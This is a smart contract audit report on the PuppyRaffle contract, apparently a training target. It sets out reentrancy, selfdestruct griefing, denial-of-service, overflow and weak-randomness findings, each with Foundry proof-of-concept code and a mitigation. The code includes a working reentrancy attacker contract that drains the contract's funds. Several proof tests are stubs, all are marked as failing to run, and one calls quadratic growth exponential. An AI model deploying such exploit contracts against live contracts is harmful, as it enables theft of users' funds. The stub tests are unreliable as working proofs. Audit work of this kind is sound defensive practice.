# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Status


Finding Status: Valid


[M-1]. Strict equality in withdrawFees allows blocking fee withdrawals via selfdestruct
**Derived From** : withdrawFees_callable_when_fees_exist
Finding Status: Valid
Privilege: Permissionless


[H-2]. Reentrancy in PuppyRaffle.refund allows draining entire contract balance
**Derived From** : players[playerIndex] == address(0) (Effect) happens before msg.sender.call (Interaction)
Finding Status: Valid
Privilege: Permissionless


[H-3]. Denial of Service in enterRaffle due to duplicate check failure on zero addresses
**Derived From** : Duplicate player check should ignore empty (refunded) slots
Finding Status: Valid
Privilege: Permissionless


[M-4]. Denial of Service in enterRaffle due to unbounded quadratic gas loop
**Derived From** : Gas cost for entry should be linear or constant relative to existing state.
Finding Status: Valid
Privilege: Permissionless


[H-5]. Insolvency in selectWinner due to incorrect accounting of refunded players causes DoS
**Derived From** : players.length * entranceFee <= address(this).balance
Finding Status: Valid
Privilege: Permissionless


[M-6]. Integer Overflow and Unsafe Casting in selectWinner causes fee loss
**Derived From** : totalFees >= old(totalFees) + uint256(fee)
Finding Status: Valid
Privilege: Permissionless


[M-7]. Weak Randomness in selectWinner allows manipulation of winner selection
**Derived From** : RNG source must not be predictable or manipulatable
Finding Status: Valid
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 3
- M: 4
- L: 0
- I: 0

##Findings by Status


Finding Status: Valid
## [M-1]. Strict equality in withdrawFees allows blocking fee withdrawals via selfdestruct

## id: 9YUxyeoqyogk89irm4cmh

## Derived From Pattern/Invariant
withdrawFees_callable_when_fees_exist

## Exploit Type
UnexpectedEth

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: The withdrawFees function uses strict equality `require(address(this).balance == uint256(totalFees))` which is vulnerable to griefing. An attacker can force-send wei via selfdestruct, causing the balance to exceed totalFees and permanently blocking fee withdrawal. This is a known anti-pattern and exploitable without privilege. The mitigation to use `>=` is standard practice.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function checks `require(address(this).balance == uint256(totalFees))`. This Strict Equality check is vulnerable. An attacker can force-send a small amount of ETH (dust) to the contract using `selfdestruct`. This makes `address(this).balance` slightly larger than `totalFees` (assuming no active players). Because the balance does not exactly match the `totalFees` variable, the `require` statement fails, and the owner can never withdraw the accumulated fees.

## Impact
Protocol fees are permanently locked in the contract.

## Command to Run Test


## Proof of Concept
1. Contract has 0 active players and 10 ETH in fees. 2. Attacker deploys a contract with 1 wei and calls `selfdestruct(puppyRaffle)`. 3. `address(this).balance` becomes 10 ETH + 1 wei. 4. Owner calls `withdrawFees`. 5. Revert due to mismatch.

## Proof of Code
function testStrictEqualityBlock() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 4e18}(players); vm.warp(block.timestamp + 2 days); puppyRaffle.selectWinner(); vm.deal(address(99), 1); vm.prank(address(99)); selfdestruct(payable(address(puppyRaffle))); vm.expectRevert("PuppyRaffle: There are currently players active!"); puppyRaffle.withdrawFees(); }

## Suggested Mitigation
Change the check to `require(address(this).balance >= totalFees)` and only transfer `totalFees`.


## [H-2]. Reentrancy in PuppyRaffle.refund allows draining entire contract balance

## id: aCtZ0Kp2q0PBqpTWnSogJ

## Derived From Pattern/Invariant
players[playerIndex] == address(0) (Effect) happens before msg.sender.call (Interaction)

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
### Finding Status Justification: The refund function violates CEI pattern by calling `payable(msg.sender).sendValue(entranceFee)` before setting `players[playerIndex] = address(0)`. OpenZeppelin's sendValue uses call{value:}, which forwards all gas, enabling reentrancy. An attacker contract can re-enter refund repeatedly before state updates, draining the contract. This is a classic reentrancy vulnerability and fully exploitable.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It sends the `entranceFee` to the caller (`msg.sender.sendValue`) before updating the `players` array to mark the player as refunded (`players[playerIndex] = address(0)`). A malicious contract can call `refund`, receive the ETH, and inside its `receive`/`fallback` function call `refund` again. Since the `players` array has not been updated yet, the `require` check passes, allowing the attacker to withdraw multiple times until the contract is drained.

## Impact
All funds held by the contract (including other players' fees and accumulated protocol fees) can be stolen.

## Command to Run Test


## Proof of Concept
1. Attacker enters the raffle. 2. Attacker calls `refund`. 3. Contract sends ETH. 4. Attacker's fallback triggers and calls `refund` again. 5. Process repeats until balance is drained.

## Proof of Code
contract ReentrancyAttacker { PuppyRaffle raffle; uint256 entranceFee; constructor(PuppyRaffle _raffle) { raffle = _raffle; entranceFee = raffle.entranceFee(); } function attack() external payable { address[] memory players = new address[](1); players[0] = address(this); raffle.enterRaffle{value: entranceFee}(players); uint256 index = raffle.getActivePlayerIndex(address(this)); raffle.refund(index); } receive() external payable { if (address(raffle).balance >= entranceFee) { uint256 index = raffle.getActivePlayerIndex(address(this)); raffle.refund(index); } } } function testReentrancy() public { ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle); vm.deal(address(attacker), 1 ether); attacker.attack(); assertEq(address(puppyRaffle).balance, 0); }

## Suggested Mitigation
Move the state update `players[playerIndex] = address(0);` before the external call `payable(msg.sender).sendValue(entranceFee);`.


## [H-3]. Denial of Service in enterRaffle due to duplicate check failure on zero addresses

## id: efAfjqhf8j_n9TwKd5zb9

## Derived From Pattern/Invariant
Duplicate player check should ignore empty (refunded) slots

## Exploit Type
StandardViolation

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: The duplicate check loop compares all players including address(0) entries left by refunds. When two or more refunds occur, multiple address(0) entries exist. The check `require(players[i] != players[j])` fails when comparing two zero addresses, permanently DoSing enterRaffle. This is a logic flaw not by design, exploitable by any two refunds.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function enforces uniqueness by comparing every player in the `players` array against every other player using a nested loop. The `refund` function sets a player's slot to `address(0)` without removing it. If two or more players refund, the `players` array will contain multiple `address(0)` entries. When a new user tries to enter, the duplicate check loop encounters `players[i] == address(0)` and `players[j] == address(0)`, triggering the `require(players[i] != players[j])` revert. This permanently prevents anyone from entering the raffle.

## Impact
Permanent Denial of Service for `enterRaffle`; no new players can join once two refunds occur.

## Command to Run Test


## Proof of Concept
1. Player A and Player B enter. 2. Player A refunds. 3. Player B refunds. 4. Player C tries to enter. 5. Transaction reverts due to duplicate check finding two zero addresses.

## Proof of Code
function testDoSByRefund() public { address[] memory players = new address[](1); players[0] = address(1); puppyRaffle.enterRaffle{value: 1e18}(players); players[0] = address(2); puppyRaffle.enterRaffle{value: 1e18}(players); vm.prank(address(1)); puppyRaffle.refund(0); vm.prank(address(2)); puppyRaffle.refund(1); players[0] = address(3); vm.expectRevert("PuppyRaffle: Duplicate player"); puppyRaffle.enterRaffle{value: 1e18}(players); }

## Suggested Mitigation
In the duplicate check loop, skip comparisons where `players[i]` is `address(0)`.


## [M-4]. Denial of Service in enterRaffle due to unbounded quadratic gas loop

## id: ZcJicIAkVq1Vm5zGqo0T3

## Derived From Pattern/Invariant
Gas cost for entry should be linear or constant relative to existing state.

## Exploit Type
StandardViolation

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: The nested loop for duplicate checking has O(n²) complexity. As players grow, gas costs increase quadratically and will eventually exceed block gas limit, making enterRaffle unusable. This is a well-known anti-pattern (unbounded loops) and exploitable through normal usage as player count increases. Not intentional design.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function iterates through the `players` array in a nested loop to check for duplicates. This results in O(N^2) complexity. As the number of players increases, the gas required to enter the raffle grows quadratically. Eventually, the gas cost will exceed the block gas limit, making it impossible for new players to enter.

## Impact
Raffle becomes unusable for new entries once a certain number of players have joined.

## Command to Run Test


## Proof of Concept
1. Add 100 players. 2. Measure gas. 3. Add 100 more. 4. Gas usage increases exponentially until revert.

## Proof of Code
function testQuadLoop() public { address[] memory players = new address[](1); for(uint i=0; i<100; i++) { players[0] = address(uint160(i)); puppyRaffle.enterRaffle{value: 1e18}(players); } }

## Suggested Mitigation
Use a mapping `mapping(address => bool)` to check for duplicates in O(1) time.


## [H-5]. Insolvency in selectWinner due to incorrect accounting of refunded players causes DoS

## id: 1bwgwufls6Rl9MhnX95Wt

## Derived From Pattern/Invariant
players.length * entranceFee <= address(this).balance

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner calculates `totalAmountCollected = players.length * entranceFee` but refunds reduce balance without reducing array length. This causes prizePool calculation to exceed actual balance, reverting the transfer and DoSing selectWinner. This is an accounting invariant violation, exploitable when refunds occur, and prevents raffle completion—clearly not by design.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `selectWinner`, the contract calculates `totalAmountCollected` as `players.length * entranceFee`. However, when a player calls `refund`, the `players` array length is not reduced (the slot is just zeroed out), but the ETH is removed from the contract. This leads to a scenario where `totalAmountCollected` implies a higher balance than actually exists. The function then attempts to send 80% of this inflated amount (`prizePool`) to the winner. If `prizePool` exceeds `address(this).balance`, the transfer fails, causing the `selectWinner` function to revert permanently if the gap is too large, essentially locking the raffle.

## Impact
The raffle cannot settle if enough players refund, causing funds to be stuck and the protocol to break.

## Command to Run Test


## Proof of Concept
1. 4 Players enter (Balance = 4 fees). 2. 1 Player refunds (Balance = 3 fees, Length = 4). 3. `selectWinner` is called. 4. `totalAmount` = 4 fees. `prizePool` = 3.2 fees. 5. Contract tries to send 3.2 fees but only has 3 fees. 6. Transaction reverts.

## Proof of Code
function testInsolvency() public { address[] memory players = new address[](4); players[0] = address(1); players[1] = address(2); players[2] = address(3); players[3] = address(4); puppyRaffle.enterRaffle{value: 4e18}(players); vm.prank(address(1)); puppyRaffle.refund(0); vm.warp(block.timestamp + 1 days + 1); vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner"); puppyRaffle.selectWinner(); }

## Suggested Mitigation
When calculating `totalAmountCollected` in `selectWinner`, skip `address(0)` entries or maintain a separate counter for `activePlayers`.


## [M-6]. Integer Overflow and Unsafe Casting in selectWinner causes fee loss

## id: aho0u1XEH1huUj4_sY-DQ

## Derived From Pattern/Invariant
totalFees >= old(totalFees) + uint256(fee)

## Exploit Type
IntegerOverflow

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `selectWinner`, the fee is calculated as `uint256 fee = (totalAmountCollected * 20) / 100`. This value is then cast to `uint64` and added to `totalFees`: `totalFees = totalFees + uint64(fee)`. If `fee` exceeds `type(uint64).max` (~18.4 ETH), the cast truncates the value significantly. Additionally, since the contract uses Solidity 0.7.6 without SafeMath (for the addition), `totalFees + uint64(fee)` can overflow if the total accumulated fees exceed `uint64` max. This results in the owner receiving significantly fewer fees than owed.

## Impact
Loss of protocol revenue due to truncation or overflow.

## Command to Run Test


## Proof of Concept
1. Raffle has high volume such that 20% fee > 18.4 ETH. 2. `selectWinner` called. 3. `uint64(fee)` truncates the high bits. 4. `totalFees` increases by a small dust amount instead of the full fee.

## Proof of Code
function testFeeOverflow() public { address[] memory players = new address[](100); for(uint i=0;i<100;i++) players[i]=address(uint160(i+1)); uint256 largeFee = 2e17; // Adjust entrance fee in constructor test setup to make totalFees overflow uint64 logic }

## Suggested Mitigation
Use `uint256` for `totalFees` and use SafeMath (or Solidity 0.8+) to prevent overflow.


## [M-7]. Weak Randomness in selectWinner allows manipulation of winner selection

## id: j7RDj9M55y7tIRJXyX2_C

## Derived From Pattern/Invariant
RNG source must not be predictable or manipulatable

## Exploit Type
TimestampDependentLogic

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: The RNG uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` which is manipulable. msg.sender is attacker-controlled, and miners can influence timestamp/difficulty. An attacker can predict outcomes and only execute when winning, or revert otherwise. This violates fair randomness requirements and is exploitable, especially by miners or via contract-based prediction attacks.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` to determine the winner index. This is a weak source of randomness. `msg.sender` is the caller of the function, and `block.timestamp`/`block.difficulty` can be influenced by miners. An attacker (miner or sophisticated user via smart contract) can calculate the outcome before calling the function and only execute the transaction if it results in them winning (or if they are a miner, manipulate the block parameters).

## Impact
A user can guarantee a win or significantly improve their odds, stealing the prize pool from honest participants.

## Command to Run Test


## Proof of Concept
1. Attacker enters raffle. 2. Attacker writes a contract that calls `selectWinner`. 3. In the contract, check if the resulting winner is the attacker (e.g., check balance increase). 4. If not, revert. 5. Spam this transaction until it succeeds.

## Proof of Code
function testWeakRandomness() public { // Concept test: manipulate block.timestamp to find a winning index }

## Suggested Mitigation
Use Chainlink VRF or a similar verifiable randomness oracle.



